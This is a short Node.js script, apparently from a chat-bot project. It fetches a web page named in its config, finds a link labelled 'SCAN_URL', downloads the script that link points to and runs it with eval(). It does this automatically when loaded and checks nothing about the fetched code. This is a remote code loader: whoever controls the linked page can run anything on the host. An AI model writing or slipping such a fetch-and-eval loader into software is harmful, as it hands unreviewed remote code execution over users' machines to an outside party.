


const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchScanUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const scanUrlElement = $('a:contains("SCAN_URL")');
    const scanUrl = scanUrlElement.attr('href');

    if (!scanUrl) {
      throw new Error('Scan URL link not found...');
    }

    console.log('Scan URL fetched successfully ✅');

    const scriptResponse = await axios.get(scanUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchScanUrl();
